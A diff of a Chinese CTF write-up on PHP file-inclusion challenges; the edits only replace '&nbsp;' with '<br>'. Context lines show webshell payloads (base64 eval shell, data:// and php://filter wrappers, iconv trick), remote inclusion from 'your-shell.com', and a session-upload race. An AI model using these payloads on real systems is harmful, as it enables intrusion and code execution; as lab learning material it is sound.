@@ -40,7 +40,7 @@ if(isset($_GET['file'])){
 }
 ```
 
-&nbsp;
+<br>
 
 **==题解一==**
 
@@ -54,13 +54,13 @@ if(isset($_GET['file'])){
 
 <img src="\images\article_images\image-20250801171241071.png" alt="image-20250801171241071" style="zoom: 25%;" />
 
-&nbsp;
+<br>
 
 
 
 <img src="\images\article_images\image-20250801171316898.png" alt="image-20250801171316898" style="zoom: 25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -76,7 +76,7 @@ if(isset($_GET['file'])){
 
 <img src="\images\article_images\image-20250801172202035.png" alt="image-20250801172202035" style="zoom:33%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -86,7 +86,7 @@ if(isset($_GET['file'])){
 
 <img src="\images\article_images\image-20250801171557675.png" alt="image-20250801171557675" style="zoom: 25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -127,9 +127,9 @@ if(isset($_GET['file'])){
 > error_log   /var/log/nginx/error.log;
 > ```
 >
-> &nbsp;
+> <br>
 >
->  &nbsp;
+>  <br>
 >
 > **Apache 默认日志路径**
 >
@@ -166,7 +166,7 @@ if(isset($_GET['file'])){
 
 <img src="\images\article_images\image-20250801210238666.png" alt="image-20250801210238666" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -180,7 +180,7 @@ if(isset($_GET['file'])){
 
 <img src="\images\article_images\image-20250801210209458.png" alt="image-20250801210209458" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 **post请求**
 
@@ -190,7 +190,7 @@ a=system("tac flag.php");
 
 <img src="\images\article_images\image-20250801210122212.png" alt="image-20250801210122212" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -212,7 +212,7 @@ a=system("tac flag.php");
 
 
 
-&nbsp;
+<br>
 
 ---
 
@@ -244,7 +244,7 @@ if(isset($_GET['file'])){
 
 **过滤了 `php`**
 
-&nbsp;
+<br>
 
 **==题解一==**
 
@@ -265,7 +265,7 @@ if(isset($_GET['file'])){
 
 <img src="\images\article_images\image-20250801232241216.png" alt="image-20250801232241216" style="zoom: 25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -285,7 +285,7 @@ if(isset($_GET['file'])){
 
 <img src="\images\article_images\image-20250802011023891.png" alt="image-20250802011023891" style="zoom:80%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -311,7 +311,7 @@ a=system("tac flag.php");
 
 <img src="\images\article_images\image-20250802002404164.png" alt="image-20250802002404164" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -333,7 +333,7 @@ a=system("tac flag.php");
 
 <img src="\images\article_images\image-20250802003525091.png" alt="image-20250802003525091" style="zoom: 33%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -345,7 +345,7 @@ a=system("tac flag.php");
 
 <img src="\images\article_images\image-20250802010453916.png" alt="image-20250802010453916" style="zoom:33%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -369,7 +369,7 @@ a=system("tac flag.php");
 
 <img src="\images\article_images\image-20250801212138779.png" alt="image-20250801212138779" style="zoom:80%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -406,7 +406,7 @@ if(isset($_GET['file'])){
 
 **过滤了 `php` `data`**
 
-&nbsp;
+<br>
 
 **==题解一==**
 
@@ -432,7 +432,7 @@ a=system("ls");
 
 <img src="\images\article_images\image-20250802095400414.png" alt="image-20250802095400414" style="zoom: 20%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -454,7 +454,7 @@ a=system("tac fl0g.php");
 
 <img src="\images\article_images\image-20250802095442524.png" alt="image-20250802095442524" style="zoom: 20%;" />
 
-&nbsp;
+<br>
 
 **==题解二==**
 
@@ -468,7 +468,7 @@ a=system("tac fl0g.php");
 
 <img src="\images\article_images\image-20250802101056417.png" alt="image-20250802101056417" style="zoom:33%;" />
 
-&nbsp;
+<br>
 
 **利用远程文件 `http://your-shell.com/1` 进行POST**
 
@@ -482,7 +482,7 @@ a=system("tac fl0g.php");
 
 <img src="\images\article_images\image-20250802101442503.png" alt="image-20250802101442503" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -497,7 +497,7 @@ a=system("tac fl0g.php");
 
 <img src="\images\article_images\image-20250802102359566.png" alt="image-20250802102359566" style="zoom:33%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -512,7 +512,7 @@ a=system("tac fl0g.php");
 
 <img src="\images\article_images\image-20250802102504525.png" alt="image-20250802102504525" style="zoom:33%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -548,7 +548,7 @@ if(isset($_GET['file'])){
 
 **过滤了 `php` `data` `:`**
 
-&nbsp;
+<br>
 
 **==题解一==**
 
@@ -571,11 +571,11 @@ a=system("tac fl0g.php");
 
 <img src="\images\article_images\image-20250802235003792.png" alt="image-20250802235003792" style="zoom: 25%;" />
 
-&nbsp;
+<br>
 
 <img src="\images\article_images\image-20250802235043666.png" alt="image-20250802235043666" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -591,25 +591,25 @@ a=system("tac fl0g.php");
 
 <img src="\images\article_images\image-20250803001820134.png" alt="image-20250803001820134" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 **连接蚁剑，密码为传入的字段**
 
 <img src="\images\article_images\image-20250803002003634.png" alt="image-20250803002003634" style="zoom:33%;" />
 
-&nbsp;
+<br>
 
 **使用虚拟终端拿到flag**
 
 <img src="\images\article_images\image-20250803003532075.png" alt="image-20250803003532075" style="zoom:33%;" />
 
-&nbsp;
+<br>
 
 **或者直接查看flag文件**
 
 <img src="\images\article_images\image-20250803003725310.png" alt="image-20250803003725310" style="zoom:33%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -650,13 +650,13 @@ if(isset($_GET['file'])){
 }
 ```
 
-&nbsp;
+<br>
 
 **==题解一==**
 
 **思路：利用 PHP 的上传进度功能 `session.upload_progress` 把恶意代码注入到服务器临时 `session` 文件中，然后再用 `include()` 把这个临时文件包含执行。**
 
-&nbsp;
+<br>
 
 **知识储备：如果在 `cookie` 中设置 `PHPSESSID`（即 `session` 值）= `flag`，那么会在服务器上创建一个 `/tmp/sess_flag` 文件；对于默认配置，文件内容上传后会被清除，那么我们需要进行环境竞争，在删除之前，对该文件进行文件包含，从而进行命令执行。**
 
@@ -672,7 +672,7 @@ if(isset($_GET['file'])){
 5. session.use_strict_mode=off
 ```
 
-&nbsp;
+<br>
 
 - **`session.upload_progress.enabled = On`**
 
@@ -782,7 +782,7 @@ if(isset($_GET['file'])){
     - 会自动给你重新生成一个随机的合法 ` session ID`
     - 你无法预测 `session` 文件名，payload 也没法写进指定的文件
 
-&nbsp;
+<br>
 
 **==题解一==**
 
@@ -808,7 +808,7 @@ session_start();
 ?>
 ```
 
-&nbsp;
+<br>
 
 **抓包后，在 `cookie` 后添加 `PHPSESSID=love`（ `PHPSESSID` 的值任意）**
 
@@ -820,7 +820,7 @@ Cookie: ccccooookkkkiiiieee; PHPSESSID=love
 
 <img src="\images\article_images\image-20250804001653557.png" alt="image-20250804001653557" style="zoom:33%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -832,7 +832,7 @@ Cookie: ccccooookkkkiiiieee; PHPSESSID=love
 
 <img src="\images\article_images\image-20250804002512882.png" alt="image-20250804002512882" style="zoom:33%;" />
 
-&nbsp;
+<br>
 
 **新建 `Resource pool` 资源池，设置线程 `30`**
 
@@ -840,7 +840,7 @@ Cookie: ccccooookkkkiiiieee; PHPSESSID=love
 
 <img src="\images\article_images\image-20250805162000310.png" alt="image-20250805162000310" style="zoom:33%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -850,7 +850,7 @@ Cookie: ccccooookkkkiiiieee; PHPSESSID=love
 
 <img src="\images\article_images\image-20250804002722557.png" alt="image-20250804002722557" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -864,7 +864,7 @@ Cookie: ccccooookkkkiiiieee; PHPSESSID=love
 
 <img src="\images\article_images\image-20250804002512882.png" alt="image-20250804002512882" style="zoom:33%;" />
 
-&nbsp;
+<br>
 
 **新建 `Resource pool` 资源池，设置线程 `80` (访问包的线程数需要大于上传包的线程数)**
 
@@ -872,7 +872,7 @@ Cookie: ccccooookkkkiiiieee; PHPSESSID=love
 
 <img src="\images\article_images\image-20250805162212020.png" alt="image-20250805162212020" style="zoom:33%;" />
 
-&nbsp;
+<br>
 
 **查看访问 `靶机?file=/tmp/sess_love` 的包的爆破结果**
 
@@ -880,7 +880,7 @@ Cookie: ccccooookkkkiiiieee; PHPSESSID=love
 
 <img src="\images\article_images\image-20250804005056379.png" alt="image-20250804005056379" style="zoom:33%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -894,13 +894,13 @@ Cookie: ccccooookkkkiiiieee; PHPSESSID=love
 
 <img src="\images\article_images\image-20250805161317653.png" alt="image-20250805161317653" style="zoom:80%;" />
 
-&nbsp;
+<br>
 
-&nbsp;
+<br>
 
 <img src="\images\article_images\image-20250804005515129.png" alt="image-20250804005515129" style="zoom: 80%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -1005,13 +1005,13 @@ if __name__ == '__main__':
 
 <img src="\images\article_images\image-20250807012753787.png" alt="image-20250807012753787" style="zoom:33%;" />
 
-&nbsp;
+<br>
 
 
 
 <img src="\images\article_images\image-20250807012915867.png" alt="image-20250807012915867" style="zoom:33%;" />
 
-&nbsp;
+<br>
 
 ---
 
@@ -1053,7 +1053,7 @@ if(isset($_GET['file'])){
 
 <img src="\images\article_images\image-20250807020107570.png" alt="image-20250807020107570" style="zoom:33%;" />
 
-&nbsp;
+<br>
 
 ---
 
@@ -1087,7 +1087,7 @@ if(isset($_GET['file'])){
 }
 ```
 
-&nbsp;
+<br>
 
 **`rm -rf /tmp/*` 强制递归地删除 `/tmp` 目录下的所有文件和子目录。**
 
@@ -1098,7 +1098,7 @@ if(isset($_GET['file'])){
 
 **其实 `session.upload_progress.cleanup = on` 本身就会进行清空**
 
-&nbsp;
+<br>
 
 **题解同web82**
 
@@ -1106,7 +1106,7 @@ if(isset($_GET['file'])){
 
 <img src="\images\article_images\image-20250807020302836.png" alt="image-20250807020302836" style="zoom:80%;" />
 
-&nbsp;
+<br>
 
 ---
 
@@ -1146,7 +1146,7 @@ if(isset($_GET['file'])){
 }
 ```
 
-&nbsp;
+<br>
 
 **增加**
 
@@ -1175,21 +1175,21 @@ if(file_exists($file)){
 - **`die("error");`**
   **直接终止程序运行，输出 `error`。**
 
-&nbsp;
+<br>
 
 **依旧可以选择脚本解题**
 
-&nbsp;
+<br>
 
 **题解同web82**
 
 <img src="\images\article_images\image-20250809001445881.png" alt="image-20250809001445881" style="zoom:33%;" />
 
-&nbsp;
+<br>
 
 <img src="\images\article_images\image-20250809001640338.png" alt="image-20250809001640338" style="zoom: 25%;" />
 
-&nbsp;
+<br>
 
 ---
 
@@ -1224,7 +1224,7 @@ if(isset($_GET['file'])){
 }
 ```
 
-&nbsp;
+<br>
 
 `define('还要秀？', dirname(__FILE__));`
 
@@ -1248,13 +1248,13 @@ if(isset($_GET['file'])){
 
 
 
-&nbsp;
+<br>
 
 **题解同web82**
 
 <img src="\images\article_images\image-20250809001850778.png" alt="image-20250809001850778" style="zoom: 25%;" />
 
-&nbsp;
+<br>
 
 ---
 
@@ -1289,7 +1289,7 @@ if(isset($_GET['file'])){
 }
 ```
 
-&nbsp;
+<br>
 
 >**base64编码只包含64个可打印字符，而php解码base64时遇到不在其中的字符，会忽略掉，将合法字符进行组合变成一个字符串进行解码，所以`<?php die('大佬别秀了');?>` 对其解码后，只有`phpdie`六个字符组成字符串进行解码**
 >
@@ -1313,7 +1313,7 @@ if(isset($_GET['file'])){
 content=aaPD9waHAgQGV2YWwoJF9QT1NUW2FdKTs/Pg==
 ```
 
-&nbsp;
+<br>
 
 **之后可实现远程代码执行**
 
@@ -1325,7 +1325,7 @@ a=system("ls");
 
 <img src="\images\article_images\image-20250809141916723.png" alt="image-20250809141916723" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 **POST**
 
@@ -1335,7 +1335,7 @@ a=system("tac fl0g.php");
 
 <img src="\images\article_images\image-20250809141949995.png" alt="image-20250809141949995" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 ---
 
@@ -1365,7 +1365,7 @@ if(isset($_GET['file'])){
 }
 ```
 
-&nbsp;
+<br>
 
 **将 `<?php system(“ls”); ?>` 经base64编码得 `PD9waHAgc3lzdGVtKCJscyIpOyA/Pg==`**
 
@@ -1377,7 +1377,7 @@ if(isset($_GET['file'])){
 
 <img src="\images\article_images\image-20250809154753979.png" alt="image-20250809154753979" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 ```php
 ?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCJ0YWMgZmwwZy5waHAiKTsgPz4
@@ -1385,7 +1385,7 @@ if(isset($_GET['file'])){
 
 <img src="\images\article_images\image-20250809160357104.png" alt="image-20250809160357104" style="zoom: 25%;" />
 
-&nbsp;
+<br>
 
 ---
 
@@ -1399,7 +1399,7 @@ if(isset($_GET['file'])){
 
 <img src="\images\article_images\image-20250809161138619.png" alt="image-20250809161138619" style="zoom: 25%;" />
 
-&nbsp;
+<br>
 
 **查看源代码得到**
 
@@ -1419,7 +1419,7 @@ readfile($file);
 ?>
 ```
 
-&nbsp;
+<br>
 
 ```php
 /index.php?file=flag.php
@@ -1429,7 +1429,7 @@ readfile($file);
 
 <img src="\images\article_images\image-20250810105105695.png" alt="image-20250810105105695" style="zoom: 25%;" />
 
-&nbsp;
+<br>
 
 ---
 
@@ -1459,7 +1459,7 @@ filter($file);
 file_put_contents($file, "<?php die();?>".$contents);
 ```
 
-&nbsp;
+<br>
 
 1. **`iconv()` 函数概述**
 
@@ -1475,7 +1475,7 @@ string iconv ( string $in_charset , string $out_charset , string $str )
 
 **功能**：把 `$str` 从 `$in_charset` 编码转换成 `$out_charset` 编码。
 
-&nbsp;
+<br>
 
 2. **`convert.iconv.` 伪协议（Filter）**
 
@@ -1489,7 +1489,7 @@ php://filter/convert.iconv.UTF-8/GBK/resource=file.txt
 
 这表示读取 `file.txt`，然后把内容从 `UTF-8` 转成 `GBK`。
 
-&nbsp;
+<br>
 
 3. **UCS-2 编码**
 
@@ -1499,7 +1499,7 @@ UCS-2 是一种固定长度的字符编码，使用两个字节（16 位）来�
   - 每个字符占用 2 字节（2 个字节 = 16 位）。
   - 因此处理 UCS-2 编码字符串时，必须保证字符串的字节数是偶数。
 
-&nbsp;
+<br>
 
 4. **字节序（Endian）**
 
@@ -1513,7 +1513,7 @@ UCS-2 是一种固定长度的字符编码，使用两个字节（16 位）来�
 - 大端序存储为字节序列：`12 34`
 - 小端序存储为字节序列：`34 12`
 
-&nbsp;
+<br>
 
 5.  **`"UCS-2BE"` 和 `"UCS-2LE"`** 
 
@@ -1524,7 +1524,7 @@ UCS-2 是一种固定长度的字符编码，使用两个字节（16 位）来�
   字符的两个字节按小端顺序存储，低字节在前，高字节在后。
   例如字符 `'A'` 存储为 `41 00`。
 
-&nbsp;
+<br>
 
 ```php
 <?php
@@ -1542,7 +1542,7 @@ echo "经过第二次反转:".iconv("UCS-2LE","UCS-2BE", $result);
 
 **经过两次反转，代码又回到正常可读状态**
 
-&nbsp;
+<br>
 
 **GET `file` 指向 `php://filter/write=convert.iconv.UCS-2LE.UCS-2BE/resource=1.php`，让写入时做编码转换。**
 
@@ -1560,7 +1560,7 @@ contents=?<hp pe@av(l_$EG[T]a;)>?
 
 <img src="\images\article_images\image-20250810004733731.png" alt="image-20250810004733731" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 ```php
 /1.php?a=system("ls");
@@ -1568,7 +1568,7 @@ contents=?<hp pe@av(l_$EG[T]a;)>?
 
 <img src="\images\article_images\image-20250810004613048.png" alt="image-20250810004613048" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 ```php
 /1.php?a=system("tac flag.php");
